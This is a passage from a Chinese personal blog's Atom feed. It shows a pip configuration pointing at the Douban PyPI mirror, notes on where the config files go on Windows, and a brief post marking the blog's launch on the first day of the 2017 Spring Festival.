<h3 id="pip-配置"><a href="#pip-配置" class="headerlink" title="pip 配置"></a>pip 配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[root@centos ~]<span class="comment"># cat ~/.pip/pip.conf</span></div><div class="line">[global]</div><div class="line">timeout = 60</div><div class="line">index-url = http://pypi.douban.com/simple/</div><div class="line">[install]</div><div class="line">trusted-host = pypi.douban.com</div><div class="line">[list]</div><div class="line">format=columns</div><div class="line">console.log(<span class="string">"我亮了"</span>)</div></pre></td></tr></table></figure>
<h2 id="Windows-设置国内镜像"><a href="#Windows-设置国内镜像" class="headerlink" title="Windows 设置国内镜像"></a>Windows 设置国内镜像</h2><p>easy_install 配置 %HOME%\pydistutils.cfg文件，内容与Linux的easy_install配置文件一样<br>pip 配置 %HOME%\pip\pip.ini文件，内容与Linux的pip配置文件一样</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;场景&quot;&gt;&lt;a href=&quot;#场景&quot; class=&quot;headerlink&quot; title=&quot;场景&quot;&gt;&lt;/a&gt;场景&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;每次使用pip安装总是很慢，有时候卡很久不动，为了解决这个问题，所以得配置到国内的镜像，这样走国内电信比较快&lt;/p
    
    </summary>
    
      <category term="python" scheme="http://www.0x001.com/categories/python/"/>
    
    
      <category term="python" scheme="http://www.0x001.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>新的开始</title>
    <link href="http://www.0x001.com/2017/01/31/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/"/>
    <id>http://www.0x001.com/2017/01/31/新的开始/</id>
    <published>2017-01-30T16:15:01.000Z</published>
    <updated>2017-06-06T17:53:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2017全新开始"><a href="#2017全新开始" class="headerlink" title="2017全新开始"></a>2017全新开始</h1><p>2017春节第一天，开始正式启用这个纯静态的博客。写了”第一篇”<br>2017春节第一天，也有很多生活感触，就不写了……<br>鸡年。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;2017全新开始&quot;&gt;&lt;a href=&quot;#2017全新开始&quot; class=&quot;headerlink&quot; title=&quot;2017全新开始&quot;&gt;&lt;/a&gt;2017全新开始&lt;/h1&gt;&lt;p&gt;2017春节第一天，开始正式启用这个纯静态的博客。写了”第一篇”&lt;br&gt;2017春节第一天，
    
    </summary>
    
      <category term="随笔日志" scheme="http://www.0x001.com/categories/%E9%9A%8F%E7%AC%94%E6%97%A5%E5%BF%97/"/>
    
    
      <category term="生活" scheme="http://www.0x001.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="感受" scheme="http://www.0x001.com/tags/%E6%84%9F%E5%8F%97/"/>
    
  </entry>
  
</feed>
